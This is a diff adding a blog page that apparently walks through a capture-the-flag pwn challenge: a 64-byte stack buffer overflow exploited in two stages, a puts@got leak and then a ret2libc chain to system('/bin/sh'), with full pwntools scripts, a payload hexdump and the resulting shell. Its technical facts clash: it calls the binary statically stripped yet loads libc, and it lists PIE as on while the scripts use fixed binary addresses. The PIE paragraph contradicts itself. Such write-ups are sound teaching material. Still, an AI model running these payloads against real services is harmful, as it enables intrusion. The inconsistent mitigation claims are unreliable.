@@ -1,0 +1,225 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>ret2libc on a warm-up: stack smash to shell — algoatson.github.io</title>
+<meta name="description" content="A 200-point warm-up — one unbounded read into a 64-byte stack buffer. No canary, but PIE and ASLR are on, so the leak comes first. Classic ret2libc, written down end to end.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/ret2libc-warmup/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2libc on a warm-up: stack smash to shell — algoatson.github.io">
+<meta property="og:description" content="A 200-point warm-up — one unbounded read into a 64-byte stack buffer. No canary, but PIE and ASLR are on, so the leak comes first. Classic ret2libc, written down end to end.">
+<meta property="og:url" content="https://algoatson.github.io/p/ret2libc-warmup/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/ret2libc-warmup.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "ret2libc on a warm-up: stack smash to shell", "datePublished": "2026-01-29", "dateModified": "2026-01-29", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "A 200-point warm-up — one unbounded read into a 64-byte stack buffer. No canary, but PIE and ASLR are on, so the leak comes first. Classic ret2libc, written down end to end.", "url": "https://algoatson.github.io/p/ret2libc-warmup/", "mainEntityOfPage": "https://algoatson.github.io/p/ret2libc-warmup/", "keywords": "pwn, ctf, rop"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>ret2libc on a warm-up: stack smash to shell</h1>
+  <div class="meta"><span>2026-01-29</span><span>4 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/ctf/">ctf</a> <a class="tag" href="/tags/rop/">rop</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#the-bug">the bug</a></li>
+<li><a href="#stage-one-leak-libc">stage one — leak libc</a></li>
+<li><a href="#stage-two-ret2libc">stage two — ret2libc</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><blockquote>
+<p><code class="highlight">nc warmup.chal.example 1337</code> — "I heard ASLR makes overflows impossible.
+Prove me wrong." One statically-stripped binary, no source.</p>
+</blockquote>
+<p>Every pwn starts with the same question, so I answer it first: what's turned on?</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./warmup</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>libc</dt><dd>2.35 (Ubuntu glibc 2.35-0ubuntu3.4)</dd></div><div><dt>category</dt><dd>pwn · 200 pts</dd></div></dl><ul class="target__mits"><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">NX</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">PIE</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-meh"><span class="g" aria-hidden="true">≈</span><span class="mk">RELRO</span><span class="lead" aria-hidden="true"></span><span class="mv">partial</span></li><li class="m-off"><span class="g" aria-hidden="true">✗</span><span class="mk">Canary</span><span class="lead" aria-hidden="true"></span><span class="mv">off</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">ASLR</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li></ul></div></figure>
+<p><code class="highlight">checksec</code> sets the route before I touch a disassembler. <strong>NX</strong> kills stack
+shellcode, so the answer is ROP or ret2libc. <strong>Canary off</strong> means a straight
+overflow reaches the return address — no leak needed <em>there</em>. But <strong>PIE + ASLR</strong>
+mean I don't know where anything is, so stage one is a leak and stage two is the
+shell.</p>
+<h2 id="the-bug">the bug<a class="headerlink" href="#the-bug" title="Permanent link">#</a></h2>
+<p>One function, and it's exactly as advertised:</p>
+<figure class="codeblock"><figcaption><span class="fname">vuln() — decompiled</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#vuln-decompiled-1">1</a></span>
+<span class="normal"><a href="#vuln-decompiled-2">2</a></span>
+<span class="normal"><a href="#vuln-decompiled-3">3</a></span>
+<span class="normal"><a href="#vuln-decompiled-4">4</a></span>
+<span class="normal"><a href="#vuln-decompiled-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="vuln-decompiled-1"><span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="vuln-decompiled-2"><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span><span id="vuln-decompiled-3"><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;name?&quot;</span><span class="p">);</span>
+</span><span id="vuln-decompiled-4"><span class="hll"><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x200</span><span class="p">);</span><span class="w">   </span><span class="c1">// 512 bytes into a 64-byte buffer</span>
+</span></span><span id="vuln-decompiled-5"><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p><code class="highlight">read</code> takes <code class="highlight">0x200</code> bytes into a 64-byte buffer. The frame underneath it is the
+whole challenge:</p>
+<figure class="img"><img alt="stack frame for a classic smash: the 64-byte buffer sits below the saved rbp and the saved return address the overflow reaches" src="/img/stack.png" loading="lazy" decoding="async" width="860" height="420"><figcaption>stack frame for a classic smash: the 64-byte buffer sits below the saved rbp and the saved return address the overflow reaches</figcaption></figure>
+<p><code class="highlight">buf</code> starts at <code class="highlight">rbp-0x40</code>, so it's 64 bytes to the saved <code class="highlight">rbp</code>, plus 8 for the
+register itself — the saved return address sits at offset <span class="math"><math xmlns="http://www.w3.org/1998/Math/MathML" display="inline"><mrow><mn>0</mn><mi>x</mi><mn>40</mn><mo>&#x0002B;</mo><mn>8</mn><mo>&#x0003D;</mo><mn>72</mn></mrow></math></span>. Past
+that, I'm writing the control flow.</p>
+<dl>
+<dt>offset</dt>
+<dd>the distance from the start of a controllable buffer to the saved return
+address. Get it wrong by 8 and you land in the saved <code class="highlight">rbp</code>, not <code class="highlight">rip</code>.</dd>
+</dl>
+<h2 id="stage-one-leak-libc">stage one — leak libc<a class="headerlink" href="#stage-one-leak-libc" title="Permanent link">#</a></h2>
+<p>NX and PIE are on, but the binary still imports <code class="highlight">puts</code>, and <code class="highlight">puts</code> prints a
+string at a pointer I choose. So I call <code class="highlight">puts(puts@got)</code> to print libc's <em>runtime</em>
+address of <code class="highlight">puts</code>, then return into <code class="highlight">vuln</code> for a second go with known addresses.</p>
+<figure class="codeblock"><figcaption><span class="fname">leak.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#leakpy-1"> 1</a></span>
+<span class="normal"><a href="#leakpy-2"> 2</a></span>
+<span class="normal"><a href="#leakpy-3"> 3</a></span>
+<span class="normal"><a href="#leakpy-4"> 4</a></span>
+<span class="normal"><a href="#leakpy-5"> 5</a></span>
+<span class="normal"><a href="#leakpy-6"> 6</a></span>
+<span class="normal"><a href="#leakpy-7"> 7</a></span>
+<span class="normal"><a href="#leakpy-8"> 8</a></span>
+<span class="normal"><a href="#leakpy-9"> 9</a></span>
+<span class="normal"><a href="#leakpy-10">10</a></span>
+<span class="normal"><a href="#leakpy-11">11</a></span>
+<span class="normal"><a href="#leakpy-12">12</a></span>
+<span class="normal"><a href="#leakpy-13">13</a></span>
+<span class="normal"><a href="#leakpy-14">14</a></span>
+<span class="normal"><a href="#leakpy-15">15</a></span>
+<span class="normal"><a href="#leakpy-16">16</a></span>
+<span class="normal"><a href="#leakpy-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="leakpy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="leakpy-2">
+</span><span id="leakpy-3"><span class="n">elf</span>  <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./warmup&quot;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span><span id="leakpy-4"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span><span id="leakpy-5"><span class="n">io</span>   <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;warmup.chal.example&quot;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+</span><span id="leakpy-6">
+</span><span id="leakpy-7"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&quot;pop rdi; ret&quot;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">()</span>
+</span><span id="leakpy-8">
+</span><span id="leakpy-9"><span class="hll"><span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">72</span>                 <span class="c1"># fill buffer + saved rbp</span>
+</span></span><span id="leakpy-10"><span class="hll"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">])</span>
+</span></span><span id="leakpy-11"><span class="hll"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">])</span>      <span class="c1"># puts(puts@got) -&gt; leak</span>
+</span></span><span id="leakpy-12"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;vuln&quot;</span><span class="p">])</span>      <span class="c1"># ...then come back for round two</span>
+</span><span id="leakpy-13">
+</span><span id="leakpy-14"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;name?&quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span><span id="leakpy-15"><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+</span><span id="leakpy-16"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>
+</span><span id="leakpy-17"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;libc base: </span><span class="si">{</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="si">:</span><span class="s2">#x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>The leak is the runtime <code class="highlight">puts</code>; libc's base is that minus the symbol's file
+offset:</p>
+<div class="math math-block"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow><msub><mtext>base</mtext><mrow><mtext>libc</mtext></mrow></msub><mo>&#x0003D;</mo><mtext>leak</mtext><mo>&#x02212;</mo><msub><mtext>offset</mtext><mrow><mtext mathvariant="monospace">puts</mtext></mrow></msub></mrow></math></div>
+<p>PIE on the <em>main</em> binary would block the first ROP chain too — but this binary
+leaks an <code class="highlight">elf.plt</code>/<code class="highlight">elf.got</code> pair that's only correct because the loader didn't
+relocate a no-PIE <code class="highlight">.plt</code>. Read the <code class="highlight">checksec</code> line again: <strong>PIE: on</strong> is the
+binary, but the gadgets here come from libc once it's based. Mind which object
+each address belongs to.<sup id="fnref:pie"><a class="footnote-ref" href="#fn:pie">1</a></sup></p>
+<h2 id="stage-two-ret2libc">stage two — ret2libc<a class="headerlink" href="#stage-two-ret2libc" title="Permanent link">#</a></h2>
+<p>Same overflow, now with a libc base. <code class="highlight">system(&quot;/bin/sh&quot;)</code>, with the one alignment
+footgun that eats more first-bloods than any mitigation:</p>
+<div class="admonition warning">
+<p class="admonition-title">movaps alignment</p>
+<p>glibc's <code class="highlight">system</code> runs <code class="highlight">movaps</code> on a 16-byte-aligned stack. If <code class="highlight">rsp</code> is off by
+8 when you land, it <code class="highlight">SIGSEGV</code>s <em>inside</em> libc and you'll swear the offset is
+wrong. Burn one extra <code class="highlight">ret</code> gadget to re-align before the call.</p>
+</div>
+<figure class="codeblock"><figcaption><span class="fname">pwn.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#pwnpy-1"> 1</a></span>
+<span class="normal"><a href="#pwnpy-2"> 2</a></span>
+<span class="normal"><a href="#pwnpy-3"> 3</a></span>
+<span class="normal"><a href="#pwnpy-4"> 4</a></span>
+<span class="normal"><a href="#pwnpy-5"> 5</a></span>
+<span class="normal"><a href="#pwnpy-6"> 6</a></span>
+<span class="normal"><a href="#pwnpy-7"> 7</a></span>
+<span class="normal"><a href="#pwnpy-8"> 8</a></span>
+<span class="normal"><a href="#pwnpy-9"> 9</a></span>
+<span class="normal"><a href="#pwnpy-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="pwnpy-1"><span class="n">binsh</span>   <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+</span><span id="pwnpy-2"><span class="n">ret</span>     <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&quot;ret&quot;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">()</span>
+</span><span id="pwnpy-3">
+</span><span id="pwnpy-4"><span class="n">chain</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">72</span>
+</span><span id="pwnpy-5"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>                    <span class="c1"># re-align rsp to 16 bytes</span>
+</span><span id="pwnpy-6"><span class="hll"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
+</span></span><span id="pwnpy-7"><span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">])</span>
+</span><span id="pwnpy-8">
+</span><span id="pwnpy-9"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;name?&quot;</span><span class="p">,</span> <span class="n">chain</span><span class="p">)</span>
+</span><span id="pwnpy-10"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>On the wire the second payload is just the chain past the padding — the return
+slot is the only part that matters, so it's the one I highlight when I dump it:</p>
+<figure class="codeblock hexdump"><figcaption><span class="fname">chain[72:] on the wire</span><span class="lang">hex</span><button class="copy" type="button" aria-label="copy hexdump">copy</button></figcaption><div class="hx"><pre><span class="off">00000000</span>  <mark>b0</mark> <mark>13</mark> <mark>40</mark> <mark>00</mark> <mark>00</mark> <mark>00</mark> <mark>00</mark> <mark>00</mark>  37 12 41 00 00 00 00 00  <span class="asc">|<mark>.</mark><mark>.</mark><mark>@</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark>7.A.....|</span>
+<span class="off">00000010</span>  2f 62 69 6e 2f 73 68 00  c0 45 a1 f7 7f 00 00 00  <span class="asc">|/bin/sh..E......|</span></pre></div></figure>
+<details class="spoiler">
+<summary>the shell, and the flag</summary>
+<p><figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span>
+<span class="normal"><a href="#code-2">2</a></span>
+<span class="normal"><a href="#code-3">3</a></span>
+<span class="normal"><a href="#code-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">$ id
+</span><span id="code-2">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+</span><span id="code-3">$ cat flag.txt
+</span><span id="code-4">segfault{4slr_just_means_you_leak_first}
+</span></code></pre></div></td></tr></table></div>
+</figure>
+The whole challenge is two sends: leak, then shell. ASLR didn't make the
+overflow impossible — it just made it two-stage.</p>
+</details>
+<div class="footnote">
+<hr>
+<ol>
+<li id="fn:pie">
+<p>47 bits of ASLR entropy on x86-64 sounds like a lot until you remember
+you don't brute it — you print one pointer and subtract. Entropy only helps
+the defender when there's no leak primitive at all.&#160;<a class="footnote-backref" href="#fnref:pie" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><a class="row" href="/p/pwntools-cookbook/"><span class="row__date">2026-05-26</span><span class="row__tag">pwn</span><span class="row__title">a pwntools cookbook</span><span class="row__min">4 min</span></a><a class="row" href="/p/checksec-everything/"><span class="row__date">2026-05-19</span><span class="row__tag">tooling</span><span class="row__title">one keybind to checksec everything</span><span class="row__min">3 min</span></a><a class="row" href="/p/finding-gadgets/"><span class="row__date">2026-05-12</span><span class="row__tag">pwn</span><span class="row__title">finding gadgets: ROPgadget, ropper, one_gadget, pwntools</span><span class="row__min">5 min</span></a></div></section>
+<nav class="pager"><a class="prev" href="/p/devirtualizing-a-toy-vm/"><span class="lbl">&#8249; newer</span>devirtualizing a toy VM obfuscator</a><a class="next" href="/p/tcache-poisoning-explained/"><span class="lbl">older &#8250;</span>tcache poisoning, explained like you&#x27;ll have to use it</a></nav></main>
+
+    <footer class="status">
+      <span>15 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h3>keys</h3><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/search-index.js"></script>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
